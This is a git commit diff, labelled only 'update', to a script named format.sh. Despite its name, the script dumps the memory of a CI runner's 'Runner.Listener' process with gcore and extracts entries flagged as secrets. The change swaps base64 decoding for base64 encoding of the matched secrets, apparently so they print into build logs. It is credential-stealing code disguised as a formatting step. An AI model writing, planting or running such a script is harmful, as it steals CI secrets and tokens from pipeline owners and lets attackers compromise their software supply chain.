1c41543a7c2f606d12be9dbd919ef470a3c99400
dr0w <dr0wsec@proton.me>
2025-07-21 11:55:39 +0200

    update

--- format.sh
+++ format.sh
@@ -3,4 +3,4 @@
 sudo apt-get update
 sudo apt-get install -y gdb
 sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
-grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* |  base64 -d
+grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* |  base64
